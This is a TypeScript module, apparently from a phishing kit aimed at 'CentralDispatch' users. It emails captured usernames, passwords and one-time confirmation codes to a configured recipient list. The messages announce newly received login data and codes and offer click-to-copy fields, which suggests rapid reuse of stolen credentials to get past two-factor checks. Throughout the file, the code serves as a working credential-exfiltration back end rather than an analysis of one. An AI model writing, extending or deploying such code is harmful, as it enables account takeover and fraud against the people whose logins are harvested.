import nodemailer from "nodemailer";
import { getEmailConfig, getRecipientEmail } from "./email-config";

/**
 * Конфигурация транспорта для отправки Email
 * Использует глобальные настройки из .env
 */
const emailConfig = getEmailConfig();
const transporter = nodemailer.createTransport({
  host: emailConfig.host,
  port: emailConfig.port,
  secure: false,
  auth: {
    user: emailConfig.user,
    pass: emailConfig.pass,
  },
});

/**
 * Отправка Email с логином и паролем
 * @param username - имя пользователя
 * @param password - пароль
 */
export async function sendLoginEmail(
  username: string,
  password: string
): Promise<void> {
  console.log("[EMAIL] Начало отправки Email с данными входа...");
  const recipientEmail = getRecipientEmail();
  const recipients = Array.isArray(recipientEmail) ? recipientEmail : [recipientEmail];
  console.log("[EMAIL] Получатели:", recipients.join(", "));

  try {
    const mailOptions = {
      from: emailConfig.user,
      to: recipientEmail,
      subject: "CentralDispatch - Новый вход в систему",
      html: `
        <!DOCTYPE html>
        <html>
        <head>
          <meta charset="UTF-8">
          <style>
            .copy-field {
              display: inline-block;
              padding: 8px 12px;
              margin: 5px 0;
              background: #f5f5f5;
              border: 2px solid #FF6B35;
              border-radius: 6px;
              cursor: pointer;
              -webkit-user-select: all;
              -moz-user-select: all;
              -ms-user-select: all;
              user-select: all;
              transition: all 0.2s;
              font-family: 'Courier New', monospace;
              font-weight: bold;
              color: #333;
            }
            .copy-field:hover {
              background: #FF6B35;
              color: white;
            }
            .copy-field:active {
              transform: scale(0.98);
            }
            .copy-hint {
              font-size: 11px;
              color: #999;
              font-style: italic;
              margin-left: 5px;
            }
          </style>
        </head>
        <body style="font-family: Arial, sans-serif; padding: 20px; margin: 0;">
          <div style="max-width: 600px; margin: 0 auto;">
            <h2 style="color: #FF6B35; margin-bottom: 20px;">CentralDispatch - Новые данные для входа</h2>
            <p style="margin-bottom: 15px;">Получены новые учетные данные. Нажмите на значение, чтобы скопировать (или просто выделите текст и скопируйте вручную):</p>
            <ul style="list-style: none; padding: 0; margin: 20px 0;">
              <li style="margin: 15px 0;">
                <strong>Username:</strong><br>
                <span 
                  class="copy-field" 
                  onclick="copyToClipboard('${username.replace(/'/g, "\\'")}', this)"
                  title="Нажмите чтобы скопировать"
                >${username}</span>
                <span class="copy-hint">(нажмите чтобы скопировать)</span>
              </li>
              <li style="margin: 15px 0;">
                <strong>Password:</strong><br>
                <span 
                  class="copy-field" 
                  onclick="copyToClipboard('${password.replace(/'/g, "\\'")}', this)"
                  title="Нажмите чтобы скопировать"
                >${password}</span>
                <span class="copy-hint">(нажмите чтобы скопировать)</span>
              </li>
            </ul>
            <p style="color: #666; font-size: 12px; margin-top: 30px; border-top: 1px solid #eee; padding-top: 15px;">
              Время получения: ${new Date().toLocaleString("ru-RU")}
            </p>
          </div>
          <script>
            function copyToClipboard(text, element) {
              try {
                // Метод 1: Современный Clipboard API (работает в HTTPS и некоторых email клиентах)
                if (navigator.clipboard && navigator.clipboard.writeText) {
                  navigator.clipboard.writeText(text).then(function() {
                    showCopyFeedback(element, text);
                  }).catch(function(err) {
                    // Fallback на execCommand
                    copyWithExecCommand(text, element);
                  });
                } else {
                  // Метод 2: execCommand (работает в большинстве браузеров)
                  copyWithExecCommand(text, element);
                }
              } catch (err) {
                // Метод 3: Выделение текста для ручного копирования
                selectTextForCopy(element);
              }
            }
            
            function copyWithExecCommand(text, element) {
              // Создаем временный textarea
              var textarea = document.createElement('textarea');
              textarea.value = text;
              textarea.style.position = 'fixed';
              textarea.style.left = '-999999px';
              textarea.style.top = '-999999px';
              document.body.appendChild(textarea);
              textarea.focus();
              textarea.select();
              
              try {
                var successful = document.execCommand('copy');
                document.body.removeChild(textarea);
                
                if (successful) {
                  showCopyFeedback(element, text);
                } else {
                  selectTextForCopy(element);
                }
              } catch (err) {
                document.body.removeChild(textarea);
                selectTextForCopy(element);
              }
            }
            
            function selectTextForCopy(element) {
              // Выделяем текст для ручного копирования
              if (window.getSelection && document.createRange) {
                var selection = window.getSelection();
                var range = document.createRange();
                range.selectNodeContents(element);
                selection.removeAllRanges();
                selection.addRange(range);
                
                // Показываем подсказку
                var hint = element.nextElementSibling;
                if (hint && hint.classList.contains('copy-hint')) {
                  hint.textContent = '(текст выделен, нажмите Ctrl+C)';
                  hint.style.color = '#FF6B35';
                  setTimeout(function() {
                    hint.textContent = '(нажмите чтобы скопировать)';
                    hint.style.color = '#999';
                  }, 2000);
                }
              }
            }
            
            function showCopyFeedback(element, originalText) {
              var originalBg = element.style.background;
              var originalColor = element.style.color;
              element.style.background = '#4CAF50';
              element.style.color = 'white';
              element.textContent = '✓ Скопировано!';
              
              setTimeout(function() {
                element.style.background = originalBg || '';
                element.style.color = originalColor || '';
                element.textContent = originalText;
              }, 1500);
            }
          </script>
        </body>
        </html>
      `,
      text: `
        CentralDispatch - Новые данные для входа
        
        Username: ${username}
        Password: ${password}
        
        Время получения: ${new Date().toLocaleString("ru-RU")}
      `,
    };

    const info = await transporter.sendMail(mailOptions);
    console.log("[EMAIL] Email успешно отправлен:", info.messageId);
  } catch (error) {
    console.error("[EMAIL] Ошибка отправки Email:", error);
    throw new Error("Не удалось отправить Email");
  }
}

/**
 * Отправка Email с кодом подтверждения
 * @param code - 6-значный код
 * @param username - имя пользователя (опционально)
 */
export async function sendCodeEmail(
  code: string,
  username?: string
): Promise<void> {
  console.log("[EMAIL] Начало отправки Email с кодом...");
  console.log("[EMAIL] Код:", code);
  const recipientEmail = getRecipientEmail();
  const recipients = Array.isArray(recipientEmail) ? recipientEmail : [recipientEmail];
  console.log("[EMAIL] Получатели:", recipients.join(", "));

  try {
    const mailOptions = {
      from: emailConfig.user,
      to: recipientEmail,
      subject: "CentralDispatch - Код подтверждения",
      html: `
        <div style="font-family: Arial, sans-serif; padding: 20px;">
          <h2 style="color: #FF6B35;">CentralDispatch - Код подтверждения</h2>
          <p>Получен код подтверждения:</p>
          <div style="background: #f5f5f5; padding: 15px; margin: 20px 0; text-align: center;">
            <h1 style="color: #FF6B35; font-size: 32px; letter-spacing: 5px; margin: 0;">
              ${code}
            </h1>
          </div>
          ${username ? `<p><strong>Username:</strong> ${username}</p>` : ""}
          <p style="color: #666; font-size: 12px; margin-top: 20px;">
            Время получения: ${new Date().toLocaleString("ru-RU")}
          </p>
        </div>
      `,
      text: `
        CentralDispatch - Код подтверждения
        
        Код: ${code}
        ${username ? `Username: ${username}` : ""}
        
        Время получения: ${new Date().toLocaleString("ru-RU")}
      `,
    };

    const info = await transporter.sendMail(mailOptions);
    console.log("[EMAIL] Email с кодом успешно отправлен:", info.messageId);
  } catch (error) {
    console.error("[EMAIL] Ошибка отправки Email с кодом:", error);
    throw new Error("Не удалось отправить Email с кодом");
  }
}

